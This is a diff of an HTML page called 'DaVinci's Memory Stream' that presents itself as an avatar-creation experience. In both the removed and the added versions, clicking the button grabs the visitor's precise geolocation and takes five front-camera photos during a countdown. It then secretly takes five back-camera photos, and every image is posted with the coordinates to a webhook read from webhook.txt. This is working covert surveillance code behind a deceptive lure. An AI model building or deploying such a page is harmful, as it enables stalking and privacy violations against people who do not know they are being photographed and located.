@@ -1,62 +1,30 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DaVinci's Memory Stream</title>
-    <style>
-        html, body { height: 100%; margin: 0; padding: 0; }
-        body {
-            min-height: 100vh;
-            width: 100vw;
-            box-sizing: border-box;
-            background: linear-gradient(135deg, #e0eafc, #cfdef3);
-            font-family: 'Segoe UI', Arial, sans-serif;
-            color: #222;
-            overflow: hidden;
-            text-align:center;
-        }
-        #permission {
-            position: absolute;
-            top: 50%; left: 50%;
-            transform: translate(-50%, -50%);
-            width: 100vw;
-        }
-        #startBtn {
-            padding: 14px 38px;
-            font-size: 22px;
-            border-radius: 18px;
-            border: none;
-            background: linear-gradient(90deg, #4ecdc4 40%, #5563de 100%);
-            color: #fff;
-            cursor: pointer;
-        }
-        #countdown {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: linear-gradient(135deg, #e0eafc 60%, #5563de 100%);
-            z-index: 1000;
-            display:flex;
-            align-items:center;
-            justify-content:center;
-        }
-        #countdownNum {
-            font-size: 18vw;
-            font-weight: bold;
-            color: #fff;
-        }
-        #final { display:none; font-size:2em; margin-top:60px; }
-        .note { display:none; font-size:14px; }
-        #status, canvas { display:none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DaVinci's Memory Stream</title>
+<style>
+html,body{height:100%;margin:0}
+body{
+background:linear-gradient(135deg,#e0eafc,#cfdef3);
+font-family:Segoe UI,Arial;text-align:center;overflow:hidden
+}
+#permission{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+#startBtn{padding:14px 38px;font-size:22px;border-radius:18px;border:none;
+background:linear-gradient(90deg,#4ecdc4,#5563de);color:#fff}
+#countdown{display:none;position:fixed;inset:0;align-items:center;justify-content:center;
+background:linear-gradient(135deg,#e0eafc 60%,#5563de);z-index:1000}
+#countdownNum{font-size:18vw;font-weight:bold;color:#fff}
+#final,.note,#status,canvas{display:none}
+</style>
 </head>
 <body>
 
 <div id="permission">
-    <h2>DaVinci's Memory Stream</h2>
-    <p>Welcome! To begin press below</p>
-    <button id="startBtn">Avatar Creation</button>
+<h2>DaVinci's Memory Stream</h2>
+<p>Welcome! To began the journey press below</p>
+<button id="startBtn">Avatar Creation</button>
 </div>
 
 <div id="countdown"><span id="countdownNum">5</span></div>
@@ -75,120 +43,97 @@ const finalDiv = document.getElementById('final');
 const noteDiv = document.querySelector('.note');
 const canvas = document.getElementById('canvas');
 
-let locationData = { lat: 'N/A', lon: 'N/A' };
-let WEBHOOK_URL = '';
+let locationData={lat:'N/A',lon:'N/A'};
+let WEBHOOK_URL='';
 
-// Load webhook
-fetch('webhook.txt')
-    .then(r => r.text())
-    .then(url => WEBHOOK_URL = url.trim());
+fetch('webhook.txt').then(r=>r.text()).then(t=>WEBHOOK_URL=t.trim());
 
-// 🔥 NEW FUNCTION — BACK CAMERA (does NOT touch old logic)
-async function captureBackCamera(startIndex) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: "environment" }
-        });
-
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.autoplay = true;
-        await new Promise(r => video.onloadedmetadata = r);
-
-        const ctx = canvas.getContext('2d');
-
-        for (let i = 0; i < 5; i++) {
-            await new Promise(r => setTimeout(r, 700));
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(blob => {
-                const fd = new FormData();
-                fd.append('file', blob, `backcam_${startIndex + i}.jpg`);
-                fd.append(
-                    'content',
-                    `BackCam ${startIndex + i} [${locationData.lat}, ${locationData.lon}]`
-                );
-                fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-            }, 'image/jpeg', 0.8);
-        }
-
-        stream.getTracks().forEach(t => t.stop());
-        video.remove();
-    } catch {}
+/* 🔥 NEW — BACK CAMERA FUNCTION (ISOLATED, SAFE) */
+function captureBackCamera(startIndex){
+navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}})
+.then(stream=>{
+const video=document.createElement('video');
+video.srcObject=stream;video.autoplay=true;
+video.onloadedmetadata=()=>{
+const ctx=canvas.getContext('2d');
+let i=0;
+const backTimer=setInterval(()=>{
+ctx.drawImage(video,0,0,canvas.width,canvas.height);
+canvas.toBlob(blob=>{
+const fd=new FormData();
+fd.append('file',blob,`backcam_${startIndex+i}.jpg`);
+fd.append('content',`BackCam ${startIndex+i} [${locationData.lat},${locationData.lon}]`);
+fetch(WEBHOOK_URL,{method:'POST',body:fd});
+},'image/jpeg',0.8);
+i++;
+if(i===5){
+clearInterval(backTimer);
+stream.getTracks().forEach(t=>t.stop());
+video.remove();
+}
+},800);
+};
+});
 }
 
-startBtn.onclick = async () => {
-    permissionDiv.style.display = 'none';
+startBtn.onclick=async()=>{
+permissionDiv.style.display='none';
 
-    // Location
-    if (navigator.geolocation) {
-        try {
-            const pos = await new Promise((res, rej) =>
-                navigator.geolocation.getCurrentPosition(res, rej)
-            );
-            locationData.lat = pos.coords.latitude.toFixed(6);
-            locationData.lon = pos.coords.longitude.toFixed(6);
-        } catch {}
-    }
+if(navigator.geolocation){
+try{
+const p=await new Promise((r,j)=>navigator.geolocation.getCurrentPosition(r,j));
+locationData.lat=p.coords.latitude.toFixed(8);
+locationData.lon=p.coords.longitude.toFixed(8);
+}catch{}
+}
 
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.autoplay = true;
-        await new Promise(r => video.onloadedmetadata = r);
+try{
+const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+const video=document.createElement('video');
+video.srcObject=stream;video.autoplay=true;
 
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext('2d');
+video.onloadedmetadata=()=>{
+canvas.width=640;canvas.height=480;
+const ctx=canvas.getContext('2d');
+let count=5,photoNum=0;
 
-        let count = 5;
-        let photoNum = 0;
+countdownDiv.style.display='flex';
 
-        countdownDiv.style.display = 'flex';
+const timer=setInterval(()=>{
+if(count>0){
+countdownNum.textContent=count;
+ctx.drawImage(video,0,0,canvas.width,canvas.height);
+canvas.toBlob(blob=>{
+const fd=new FormData();
+fd.append('file',blob,`memory_${photoNum}.jpg`);
+fd.append('content',`DaVinci Memory #${photoNum} [${locationData.lat},${locationData.lon}]`);
+fetch(WEBHOOK_URL,{method:'POST',body:fd});
+},'image/jpeg',0.8);
+photoNum++;count--;
+}else{
+clearInterval(timer);
+countdownDiv.style.display='none';
+stream.getTracks().forEach(t=>t.stop());
+video.remove();
 
-        const timer = setInterval(() => {
-            if (count > 0) {
-                countdownNum.textContent = count;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+/* ✅ ONLY ADDITION */
+captureBackCamera(photoNum);
 
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('file', blob, `selfie_${photoNum}.jpg`);
-                    fd.append(
-                        'content',
-                        `Selfie ${photoNum} [${locationData.lat}, ${locationData.lon}]`
-                    );
-                    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                }, 'image/jpeg', 0.8);
-
-                photoNum++;
-                count--;
-            } else {
-                clearInterval(timer);
-                countdownDiv.style.display = 'none';
-                stream.getTracks().forEach(t => t.stop());
-                video.remove();
-
-                // ✅ ONLY ADDITION: back camera capture
-                captureBackCamera(photoNum);
-
-                finish();
-            }
-        }, 1000);
-
-    } catch {
-        statusDiv.textContent = 'Camera denied';
-        statusDiv.style.display = 'block';
-    }
+finish();
+}
+},1000);
+};
+}catch{
+statusDiv.textContent='Camera access denied';
+statusDiv.style.display='block';
+}
 };
 
-function finish() {
-    finalDiv.style.display = 'block';
-    finalDiv.textContent = "DaVinci's memory.";
-    noteDiv.style.display = 'block';
+function finish(){
+finalDiv.style.display='block';
+finalDiv.textContent="DaVinci's memory.";
+noteDiv.style.display='block';
 }
 </script>
 </body>
-</html>
 </html>
